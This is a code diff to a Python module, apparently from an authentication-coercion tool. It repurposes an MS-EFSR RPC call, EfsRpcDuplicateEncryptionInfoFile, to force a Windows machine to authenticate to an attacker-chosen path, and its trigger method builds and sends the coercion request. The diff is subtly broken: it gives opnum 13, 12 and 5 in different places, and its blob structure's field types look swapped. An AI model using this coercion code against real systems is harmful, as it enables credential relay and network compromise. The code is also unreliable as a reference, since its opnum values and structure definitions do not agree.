@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# File name          : EfsRpcDecryptFileSrv.py
+# File name          : EfsRpcDuplicateEncryptionInfoFile.py
 # Author             : Podalirius (@podalirius_)
 # Date created       : 16 Sep 2022
 
@@ -11,27 +11,38 @@ from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
 from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, GUID
 
 
-class _EfsRpcDecryptFileSrv(NDRCALL):
-    """
-    Structure to make the RPC call to EfsRpcDecryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)
-    """
-    opnum = 5
+class EFS_RPC_BLOB(NDRSTRUCT):
     structure = (
-        ('FileName', WSTR),   # Type: wchar_t *
-        ('OpenFlag', ULONG),  # Type: unsigned
+        ('Data', DWORD),
+        ('cbData', PCHAR),
     )
 
 
-class _EfsRpcDecryptFileSrvResponse(NDRCALL):
+class _EfsRpcDuplicateEncryptionInfoFile(NDRCALL):
     """
-    Structure to parse the response of the RPC call to EfsRpcDecryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)
+    Structure to make the RPC call to EfsRpcDuplicateEncryptionInfoFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)
+    """
+    opnum = 13
+    structure = (
+        ('SrcFileName', WSTR), # Type: wchar_t *
+        ('DestFileName', WSTR), # Type: wchar_t *
+        ('dwCreationDisposition', DWORD), # Type: DWORD
+        ('dwAttributes', DWORD), # Type: DWORD
+        ('RelativeSD', EFS_RPC_BLOB), # Type: EFS_RPC_BLOB *
+        ('bInheritHandle', BOOL), # Type: BOOL
+    )
+
+
+class _EfsRpcDuplicateEncryptionInfoFileResponse(NDRCALL):
+    """
+    Structure to parse the response of the RPC call to EfsRpcDuplicateEncryptionInfoFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)
     """
     structure = ()
 
 
-class EfsRpcDecryptFileSrv(MSPROTOCOLRPCCALL):
+class EfsRpcDuplicateEncryptionInfoFile(MSPROTOCOLRPCCALL):
     """
-    Coercing a machine to authenticate using function EfsRpcDecryptFileSrv (opnum 5) of [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)
+    Coercing a machine to authenticate using function EfsRpcDuplicateEncryptionInfoFile (opnum 5) of [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)
 
     Method found by:
      - [@topotam77](https://twitter.com/topotam77)
@@ -80,17 +91,21 @@ class EfsRpcDecryptFileSrv(MSPROTOCOLRPCCALL):
     }
 
     function = {
-        "name": "EfsRpcDecryptFileSrv",
-        "opnum": 5,
-        "vulnerable_arguments": ["FileName"]
+        "name": "EfsRpcDuplicateEncryptionInfoFile",
+        "opnum": 12,
+        "vulnerable_arguments": ["SrcFileName"]
     }
 
     def trigger(self, dcerpc_session, target):
         if dcerpc_session is not None:
             try:
-                request = _EfsRpcDecryptFileSrv()
-                request['FileName'] = self.path
-                request['OpenFlag'] = 0
+                request = _EfsRpcDuplicateEncryptionInfoFile()
+                request['SrcFileName'] = self.path
+                request['DestFileName'] = self.path
+                request['dwCreationDisposition'] = 0
+                request['dwAttributes'] = 0
+                request['RelativeSD'] = EFS_RPC_BLOB()
+                request['bInheritHandle'] = 0
                 resp = dcerpc_session.request(request)
                 return ""
             except Exception as err:
